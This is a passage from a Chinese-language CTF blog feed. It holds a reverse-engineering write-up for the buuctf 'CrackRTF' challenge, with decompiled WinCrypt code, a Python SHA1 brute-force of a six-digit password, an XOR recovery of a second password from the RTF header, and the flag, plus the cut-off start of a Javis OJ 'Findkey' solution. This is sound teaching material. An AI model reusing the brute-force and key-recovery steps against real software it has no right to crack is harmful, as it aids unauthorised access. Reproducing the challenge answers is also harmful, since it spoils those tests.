Chaining</a> (CBC).</p><p><code>dwFlags</code><br>The following flag value is defined.</p><table><thead><tr><th align="left">Value</th><th align="left">Meaning</th></tr></thead><tbody><tr><td align="left"><strong>CRYPT_SECRETDIGEST</strong>0x00000001</td><td align="left">This flag is not used.</td></tr></tbody></table><p><code>phHash</code><br>The address to which the function copies a handle to the new hash object. When you have finished using the hash object, release the handle by calling the <a href="https://docs.microsoft.com/windows/desktop/api/wincrypt/nf-wincrypt-cryptdestroyhash">CryptDestroyHash</a> function.</p><p>需要关注<code>Algid</code>，定义了加密的方式，在 <a href="https://docs.microsoft.com/windows/desktop/SecCrypto/alg-id">ALG_ID</a> 查一下<code>0x8004</code></p><table><thead><tr><th align="left">Identifier</th><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">CALG_SHA</td><td align="left">0x00008004</td><td align="left">SHA hashing algorithm. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider">Microsoft Base Cryptographic Provider</a>.</td></tr><tr><td align="left">CALG_SHA1</td><td align="left">0x00008004</td><td align="left">Same as <strong>CALG_SHA</strong>. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider">Microsoft Base Cryptographic Provider</a>.</td></tr></tbody></table><p><code>sha1</code>加密，对我们输入的6位纯数字和后面接上的字符串进行sha1加密然后直接进行字符串对比，知道是数字所以爆破非常简单</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag2 = <span class="hljs-string">'@DBApp'</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100000</span>, <span class="hljs-number">999999</span>):</span><br><span class="line">    h2 = hashlib.sha1((<span class="hljs-built_in">str</span>(i) + flag2).encode(<span class="hljs-string">'utf-8'</span>))</span><br><span class="line">    flags = h2.hexdigest()</span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">"6e32d0943418c2c33385bc35a1470250dd8923a9"</span> == flags:</span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(i) + flag2)</span><br><span class="line">        <span class="hljs-built_in">print</span>(flags)</span><br></pre></td></tr></tbody></table></figure><p>输出得到第一部分的密码</p><figure class="highlight llvm hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">123321</span><span class="hljs-title">@DBApp</span></span><br><span class="line"><span class="hljs-number">6e32</span>d<span class="hljs-number">0943418</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">33385</span>bc<span class="hljs-number">35</span>a<span class="hljs-number">1470250</span>dd<span class="hljs-number">8923</span>a<span class="hljs-number">9</span></span><br></pre></td></tr></tbody></table></figure><p>然后看一下下一部分加密</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __cdecl <span class="hljs-title">FUN_00401040</span><span class="hljs-params">(BYTE *param_1,DWORD param_2,LPSTR param_3)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar1;</span><br><span class="line">  undefined4 *puVar2;</span><br><span class="line">  undefined4 local_68 [<span class="hljs-number">16</span>];</span><br><span class="line">  uint local_28;</span><br><span class="line">  CHAR local_24 [<span class="hljs-number">4</span>];</span><br><span class="line">  byte local_20 [<span class="hljs-number">16</span>];</span><br><span class="line">  DWORD local_10;</span><br><span class="line">  HCRYPTHASH local_c;</span><br><span class="line">  HCRYPTPROV local_8;</span><br><span class="line">  </span><br><span class="line">  iVar1 = <span class="hljs-number">0x19</span>;</span><br><span class="line">  puVar2 = local_68;</span><br><span class="line">  <span class="hljs-keyword">while</span> (iVar1 != <span class="hljs-number">0</span>) {</span><br><span class="line">    iVar1 = iVar1 + <span class="hljs-number">-1</span>;</span><br><span class="line">    *puVar2 = <span class="hljs-number">0xcccccccc</span>;</span><br><span class="line">    puVar2 = puVar2 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">CryptAcquireContextA</span>(&amp;local_8,(LPCSTR)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0xf0000000</span>);</span><br><span class="line">  iVar1 = __chkesp();</span><br><span class="line">  <span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) {</span><br><span class="line">    <span class="hljs-built_in">CryptCreateHash</span>(local_8,<span class="hljs-number">0x8003</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,&amp;local_c);</span><br><span class="line">    iVar1 = __chkesp();</span><br><span class="line">    <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {</span><br><span class="line">      <span class="hljs-built_in">CryptReleaseContext</span>(local_8,<span class="hljs-number">0</span>);</span><br><span class="line">      __chkesp();</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> {</span><br><span class="line">      <span class="hljs-built_in">CryptHashData</span>(local_c,param_1,param_2,<span class="hljs-number">0</span>);</span><br><span class="line">      iVar1 = __chkesp();</span><br><span class="line">      <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) {</span><br><span class="line">        <span class="hljs-built_in">CryptDestroyHash</span>(local_c);</span><br><span class="line">        __chkesp();</span><br><span class="line">        <span class="hljs-built_in">CryptReleaseContext</span>(local_8,<span class="hljs-number">0</span>);</span><br><span class="line">        __chkesp();</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span> {</span><br><span class="line">        <span class="hljs-built_in">CryptGetHashParam</span>(local_c,<span class="hljs-number">2</span>,local_20,&amp;local_10,<span class="hljs-number">0</span>);</span><br><span class="line">        __chkesp();</span><br><span class="line">        *param_3 = <span class="hljs-string">'\0'</span>;</span><br><span class="line">        local_28 = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">while</span> (local_28 &lt; local_10) {</span><br><span class="line">          <span class="hljs-built_in">wsprintfA</span>(local_24,<span class="hljs-string">"%02X"</span>,(uint)local_20[local_28]);</span><br><span class="line">          __chkesp();</span><br><span class="line">          <span class="hljs-built_in">lstrcatA</span>(param_3,local_24);</span><br><span class="line">          __chkesp();</span><br><span class="line">          local_28 = local_28 + <span class="hljs-number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-built_in">CryptDestroyHash</span>(local_c);</span><br><span class="line">        __chkesp();</span><br><span class="line">        <span class="hljs-built_in">CryptReleaseContext</span>(local_8,<span class="hljs-number">0</span>);</span><br><span class="line">        __chkesp();</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  local_8 = <span class="hljs-number">0x4011c8</span>;</span><br><span class="line">  __chkesp();</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>和上面的加密几乎一样，但是这次是<code>0x8003</code>，再查一查</p><table><thead><tr><th align="left">Identifier</th><th align="left">Value</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">CALG_MD5</td><td align="left">0x00008003</td><td align="left">MD5 hashing algorithm. This algorithm is supported by the <a href="https://docs.microsoft.com/zh-cn/windows/win32/seccrypto/microsoft-base-cryptographic-provider">Microsoft Base Cryptographic Provider</a>.</td></tr></tbody></table><p><code>md5</code>加密，并且没有限定字符的范围，<del>下辈子都跑不出来</del></p><p>再往下面看，两层加密都通过之后</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __cdecl <span class="hljs-title">FUN_004014d0</span><span class="hljs-params">(LPCSTR param_1)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar1;</span><br><span class="line">  undefined4 *puVar2;</span><br><span class="line">  undefined4 local_64 [<span class="hljs-number">16</span>];</span><br><span class="line">  undefined4 local_24;</span><br><span class="line">  LPCVOID local_20;</span><br><span class="line">  undefined4 local_1c;</span><br><span class="line">  DWORD local_18;</span><br><span class="line">  uint local_14;</span><br><span class="line">  HGLOBAL local_10;</span><br><span class="line">  HRSRC local_c;</span><br><span class="line">  HANDLE local_8;</span><br><span class="line">  </span><br><span class="line">  iVar1 = <span class="hljs-number">0x18</span>;</span><br><span class="line">  puVar2 = local_64;</span><br><span class="line">  <span class="hljs-keyword">while</span> (iVar1 != <span class="hljs-number">0</span>) {</span><br><span class="line">    iVar1 = iVar1 + <span class="hljs-number">-1</span>;</span><br><span class="line">    *puVar2 = <span class="hljs-number">0xcccccccc</span>;</span><br><span class="line">    puVar2 = puVar2 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  local_8 = (HANDLE)<span class="hljs-number">0x0</span>;</span><br><span class="line">  local_c = (HRSRC)<span class="hljs-number">0x0</span>;</span><br><span class="line">  local_10 = (HGLOBAL)<span class="hljs-number">0x0</span>;</span><br><span class="line">  local_14 = <span class="hljs-number">0</span>;</span><br><span class="line">  local_18 = <span class="hljs-number">0</span>;</span><br><span class="line">  local_1c = <span class="hljs-number">0</span>;</span><br><span class="line">  local_20 = (LPCVOID)<span class="hljs-number">0x0</span>;</span><br><span class="line">  local_24 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">FindResourceA</span>((HMODULE)<span class="hljs-number">0x0</span>,(LPCSTR)<span class="hljs-number">0x65</span>,<span class="hljs-string">"AAA"</span>);</span><br><span class="line">  local_c = (HRSRC)__chkesp();</span><br><span class="line">  <span class="hljs-keyword">if</span> (local_c != (HRSRC)<span class="hljs-number">0x0</span>) {</span><br><span class="line">    <span class="hljs-built_in">SizeofResource</span>((HMODULE)<span class="hljs-number">0x0</span>,local_c);</span><br><span class="line">    local_14 = __chkesp();</span><br><span class="line">    <span class="hljs-built_in">LoadResource</span>((HMODULE)<span class="hljs-number">0x0</span>,local_c);</span><br><span class="line">    local_10 = (HGLOBAL)__chkesp();</span><br><span class="line">    <span class="hljs-keyword">if</span> (local_10 != (HGLOBAL)<span class="hljs-number">0x0</span>) {</span><br><span class="line">      <span class="hljs-built_in">LockResource</span>(local_10);</span><br><span class="line">      local_20 = (LPCVOID)__chkesp();</span><br><span class="line">      <span class="hljs-built_in">thunk_FUN_00401420</span>(param_1,(<span class="hljs-keyword">int</span>)local_20,local_14);</span><br><span class="line">      <span class="hljs-built_in">CreateFileA</span>(<span class="hljs-string">"dbapp.rtf"</span>,<span class="hljs-number">0x10000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,(HANDLE)<span class="hljs-number">0x0</span>);</span><br><span class="line">      local_8 = (HANDLE)__chkesp();</span><br><span class="line">      <span class="hljs-keyword">if</span> (local_8 != (HANDLE)<span class="hljs-number">0xffffffff</span>) {</span><br><span class="line">        <span class="hljs-built_in">WriteFile</span>(local_8,local_20,local_14,&amp;local_18,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);</span><br><span class="line">        iVar1 = __chkesp();</span><br><span class="line">        <span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) {</span><br><span class="line">          <span class="hljs-built_in">CloseHandle</span>(local_8);</span><br><span class="line">          __chkesp();</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  local_8 = (HANDLE)<span class="hljs-number">0x40162d</span>;</span><br><span class="line">  __chkesp();</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>写了一个<code>dbapp.rtf</code>，写入的内容在上面一个函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __cdecl <span class="hljs-title">FUN_00401420</span><span class="hljs-params">(LPCSTR param_1,<span class="hljs-keyword">int</span> param_2,uint param_3)</span></span></span><br><span class="line"><span class="hljs-function"></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  uint uVar1;</span><br><span class="line">  <span class="hljs-keyword">int</span> iVar2;</span><br><span class="line">  undefined4 *puVar3;</span><br><span class="line">  undefined4 local_50 [<span class="hljs-number">16</span>];</span><br><span class="line">  uint local_10;</span><br><span class="line">  LPCSTR local_c;</span><br><span class="line">  undefined4 local_8;</span><br><span class="line">  </span><br><span class="line">  iVar2 = <span class="hljs-number">0x13</span>;</span><br><span class="line">  puVar3 = local_50;</span><br><span class="line">  <span class="hljs-keyword">while</span> (iVar2 != <span class="hljs-number">0</span>) {</span><br><span class="line">    iVar2 = iVar2 + <span class="hljs-number">-1</span>;</span><br><span class="line">    *puVar3 = <span class="hljs-number">0xcccccccc</span>;</span><br><span class="line">    puVar3 = puVar3 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">lstrlenA</span>(param_1);</span><br><span class="line">  uVar1 = __chkesp();</span><br><span class="line">  local_c = param_1;</span><br><span class="line">  local_10 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> (local_10 &lt; param_3) {</span><br><span class="line">    *(byte *)(param_2 + local_10) = *(byte *)(param_2 + local_10) ^ param_1[local_10 % uVar1];</span><br><span class="line">    local_10 = local_10 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  local_8 = <span class="hljs-number">0x4014a3</span>;</span><br><span class="line">  __chkesp();</span><br><span class="line">  <span class="hljs-keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现前面不知从哪里获取了一些内容，然后和我们输入的密码进行了一个循环异或，写入一个<code>rtf</code>文件</p><p>这里有一个点就是<code>rtf</code>文件的文件头是固定的6个字符，可以通过这里来算出来输入的第二次密码是什么</p><p>可以用<code>ResourceHacker</code>看一下<code>AAA</code>到底是什么</p><p><img src="/2020/04/01/CrackRTF-buuctf/AAA.png" alt="AAA"></p><p>然后异或一下出来密码</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="hljs-string">"{\\rtf1"</span></span><br><span class="line"> </span><br><span class="line">a = [<span class="hljs-number">0x05</span>,<span class="hljs-number">0x7D</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x15</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x01</span>]</span><br><span class="line"> </span><br><span class="line">flag = <span class="hljs-string">""</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):</span><br><span class="line">    x = <span class="hljs-built_in">ord</span>(s[i]) ^ a[i]</span><br><span class="line">    flag += <span class="hljs-built_in">chr</span>(x)</span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>得到第二个密码<code>~!3a@0</code></p><p>两个都通过后会生成一个<code>rtf</code>文件，内容是<code>flag</code></p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Flag</span>{N<span class="hljs-number">0</span>_M<span class="hljs-number">0</span>re_Free_Bugs}</span><br></pre></td></tr></tbody></table></figure><p>但是提交的时候要交小写的<code>flag</code></p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javis-OJ-wp</title>
      <link href="/2020/04/01/Javis-OJ-wp/"/>
      <url>/2020/04/01/Javis-OJ-wp/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>Javis OJ的题目还是很不错的，可以仔细研究研究</p><span id="more"></span><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="Findkey"><a href="#Findkey" class="headerlink" title="Findkey"></a>Findkey</h4><p><code>DIE</code>看看发现是<code>pyc</code>文件，试一下<code>uncompyle6</code>发现直接成功没加任何保护，看看代码</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> sys</span><br><span class="line">lookup = [</span><br><span class="line"> <span class="hljs-number">196</span>, <span class="hljs-number">153</span>, <span class="hljs-number">149</span>, <span class="hljs-number">206</span>, <span class="hljs-number">17</span>, <span class="hljs-number">221</span>, <span class="hljs-number">10</span>, <span class="hljs-number">217</span>, <span class="hljs-number">167</span>, <span class="hljs-number">18</span>, <span class="hljs-number">36</span>, <span class="hljs-number">135</span>, <span class="hljs-number">103</span>, <span class="hljs-number">61</span>, <span class="hljs-number">111</span>, <span class="hljs-number">31</span>, <span class="hljs-number">92</span>, <span class="hljs-number">152</span>, <span class="hljs-number">21</span>, <span class="hljs-number">228</span>, <span class="hljs-number">105</span>, <span class="hljs-number">191</span>, <span class="hljs-number">173</span>, <span class="hljs-number">41</span>, <span class="hljs-number">2</span>, <span class="hljs-number">245</span>, <span class="hljs-number">23</span>, <span class="hljs-number">144</span>, <span class="hljs-number">1</span>, <span class="hljs-number">246</span>, <span class="hljs-number">89</span>, <span class="hljs-number">178</span>, <span class="hljs-number">182</span>, <span class="hljs-number">119</span>, <span class="hljs-number">38</span>, <span class="hljs-number">85</span>, <span class="hljs-number">48</span>, <span class="hljs-number">226</span>, <span class="hljs-number">165</span>, <span class="hljs-number">241</span>, <span class="hljs-number">166</span>, <span class="hljs-number">214</span>, <span class="hljs-number">71</span>, <span class="hljs-number">90</span>, <span class="hljs-number">151</span>, <span class="hljs-number">3</span>, <span class="hljs-number">109</span>, <span class="hljs-number">169</span>, <span class="hljs-number">150</span>, <span class="hljs-number">224</span>, <span class="hljs-number">69</span>, <span class="hljs-number">156</span>, <span class="hljs-number">158</span>, <span class="hljs-number">57</span>, <span class="hljs-number">181</span>, <span class="hljs-number">29</span>, <span class="hljs-number">200</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">252</span>, <span class="hljs-number">227</span>, <span class="hljs-number">93</span>, <span class="hljs-number">65</span>, <span class="hljs-number">82</span>, <span class="hljs-number">66</span>, <span class="hljs-number">80</span>, <span class="hljs-number">170</span>, <span class="hljs-number">77</span>, <span class="hljs-number">49</span>, <span class="hljs-number">177</span>, <span class="hljs-number">81</span>, <span class="hljs-number">94</span>, <span class="hljs-number">202</span>, <span class="hljs-number">107</span>, <span class="hljs-number">25</span>, <span class="hljs-number">73</span>, <span class="hljs-number">148</span>, <span class="hljs-number">98</span>, <span class="hljs-number">129</span>, <span class="hljs-number">231</span>, <span class="hljs-number">212</span>, <span class="hljs-number">14</span>, <span class="hljs-number">84</span>, <span class="hljs-number">121</span>, <span class="hljs-number">174</span>, <span class="hljs-number">171</span>, <span class="hljs-number">64</span>, <span class="hljs-number">180</span>, <span class="hljs-number">233</span>, <span class="hljs-number">74</span>, <span class="hljs-number">140</span>, <span class="hljs-number">242</span>, <span class="hljs-number">75</span>, <span class="hljs-number">104</span>, <span class="hljs-number">253</span>, <span class="hljs-number">44</span>, <span class="hljs-number">39</span>, <span class="hljs-number">87</span>, <span class="hljs-number">86</span>, <span class="hljs-number">27</span>, <span class="hljs-number">68</span>, <span class="hljs-number">22</span>, <span class="hljs-number">55</span>, <span class="hljs-number">76</span>, <span class="hljs-number">35</span>, <span class="hljs-number">248</span>, <span class="hljs-number">96</span>, <span class="hljs-number">5</span>, <span class="hljs-number">56</span>, <span class="hljs-number">20</span>, <span class="hljs-number">161</span>, <span class="hljs-number">213</span>, <span class="hljs-number">238</span>, <span class="hljs-number">220</span>, <span class="hljs-number">72</span>, <span class="hljs-number">100</span>, <span class="hljs-number">247</span>, <span class="hljs-number">8</span>, <span class="hljs-number">63</span>, <span class="hljs-number">249</span>, <span class="hljs-number">145</span>, <span class="hljs-number">243</span>, <span class="hljs-number">155</span>, <span class="hljs-number">222</span>, <span class="hljs-number">122</span>, <span class="hljs-number">32</span>, <span class="hljs-number">43</span>, <span class="hljs-number">186</span>, <span class="hljs-number">0</span>, <span class="hljs-number">102</span>, <span class="hljs-number">216</span>, <span class="hljs-number">126</span>, <span class="hljs-number">15</span>, <span class="hljs-number">42</span>, <span class="hljs-number">115</span>, <span class="hljs-number">138</span>, <span class="hljs-number">240</span>, <span class="hljs-number">147</span>, <span class="hljs-number">229</span>, <span class="hljs-number">204</span>, <span class="hljs-number">117</span>, <span class="hljs-number">223</span>, <span class="hljs-number">141</span>, <span class="hljs-number">159</span>, <span class="hljs-number">131</span>, <span class="hljs-number">232</span>, <span class="hljs-number">124</span>, <span class="hljs-number">254</span>, <span class="hljs-number">60</span>, <span class="hljs-number">116</span>, <span class="hljs-number">46</span>, <span class="hljs-number">113</span>, <span class="hljs-number">79</span>, <span class="hljs-number">16</span>, <span class="hljs-number">128</span>, <span class="hljs-number">6</span>, <span class="hljs-number">251</span>, <span class="hljs-number">40</span>, <span class="hljs-number">205</span>, <span class="hljs-number">137</span>, <span class="hljs-number">199</span>, <span class="hljs-number">83</span>, <span class="hljs-number">54</span>, <span class="hljs-number">188</span>, <span class="hljs-number">19</span>, <span class="hljs-number">184</span>, <span class="hljs-number">201</span>, <span class="hljs-number">110</span>, <span class="hljs-number">255</span>, <span class="hljs-number">26</span>, <span class="hljs-number">91</span>, <span class="hljs-number">211</span>, <span class="hljs-number">132</span>, <span class="hljs-number">160</span>, <span class="hljs-number">168</span>, <span class="hljs-number">154</span>, <span class="hljs-number">185</span>, <span class="hljs-number">183</span>, <span class="hljs-number">244</span>, <span class="hljs-number">78</span>, <span class="hljs-number">33</span>, <span class="hljs-number">123</span>, <span class="hljs-number">28</span>, <span class="hljs-number">59</span>, <span class="hljs-number">12</span>, <span class="hljs-number">210</span>, <span class="hljs-number">218</span>, <span class="hljs-number">47</span>, <span class="hljs-number">163</span>, <span class="hljs-number">215</span>, <span class="hljs-number">209</span>, <span class="hljs-number">108</span>, <span class="hljs-number">235</span>, <span class="hljs-number">237</span>, <span class="hljs-number">118</span>, <span class="hljs-number">101</span>, <span class="hljs-number">24</span>, <span class="hljs-number">234</span>, <span class="hljs-number">106</span>, <span class="hljs-number">143</span>, <span class="hljs-number">88</span>, <span class="hljs-number">9</span>, <span class="hljs-number">136</span>, <span class="hljs-number">95</span>, <span class="hljs-number">30</span>, <span class="hljs-number">193</span>, <span class="hljs-number">176</span>, <span class="hljs-number">225</span>, <span class="hljs-number">198</span>, <span class="hljs-number">197</span>, <span class="hljs-number">194</span>, <span class="hljs-number">239</span>, <span class="hljs-number">134</span>, <span class="hljs-number">162</span>, <span class="hljs-number">192</span>, <span class="hljs-number">11</span>, <span class="hljs-number">70</span>, <span class="hljs-number">58</span>, <span class="hljs-number">187</span>, <span class="hljs-number">50</span>, <span class="hljs-number">67</span>, <span class="hljs-number">236</span>, <span class="hljs-number">230</span>, <span class="hljs-number">13</span>, <span class="hljs-number">99</span>, <span class="hljs-number">190</span>, <span class="hljs-number">208</span>, <span class="hljs-number">207</span>, <span class="hljs-number">7</span>, <span class="hljs-number">53</span>, <span class="hljs-number">219</span>, <span class="hljs-number">203</span>, <span class="hljs-number">62</span>, <span class="hljs-number">114</span>, <span class="hljs-number">127</span>, <span class="hljs-number">125</span>, <span class="hljs-number">164</span>, <span class="hljs-number">179</span>, <span class="hljs-number">175</span>, <span class="hljs-number">112</span>, <span class="hljs-number">172</span>, <span class="hljs-number">250</span>, <span class="hljs-number">133</span>, <span class="hljs-number">130</span>, <span class="hljs-number">52</span>, <span class="hljs-number">189</span>, <span class="hljs-number">97</span>, <span class="hljs-number">146</span>, <span class="hljs-number">34</span>, <span class="hljs-number">157</span>, <span class="hljs-number">120</span>, <span class="hljs-number">195</span>, <span class="hljs-number">45</span>, <span class="hljs-number">4</span>, <span class="hljs-number">142</span>, <span class="hljs-number">139</span>]</span><br><span class="line">pwda = [</span><br><span class="line"> <span class="hljs-number">188</span>, <span class="hljs-number">155</span>, <span class="hljs-number">11</span>, <span class="hljs-number">58</span>, <span class="hljs-number">251</span>, <span class="hljs-number">208</span>, <span class="hljs-number">204</span>, <span class="hljs-number">202</span>, <span class="hljs-number">150</span>, <span class="hljs-number">120</span>, <span class="hljs-number">206</span>, <span class="hljs-number">237</span>, <span class="hljs-number">114</span>, <span class="hljs-number">92</span>, <span class="hljs-number">126</span>, <span class="hljs-number">6</span>, <span class="hljs-number">42</span>]</span><br><span class="line">pwdb = [<span class="hljs-number">53</span>, <span class="hljs-number">222</span>, <span class="hljs-number">230</span>, <span class="hljs-number">35</span>, <span class="hljs-number">67</span>, <span class="hljs-number">248</span>, <span class="hljs-number">226</span>, <span class="hljs-number">216</span>, <span class="hljs-number">17</span>, <span class="hljs-number">209</span>, <span class="hljs-number">32</span>, <span class="hljs-number">2</span>, <span class="hljs-number">181</span>, <span class="hljs-number">200</span>, <span class="hljs-number">171</span>, <span class="hljs-number">60</span>, <span 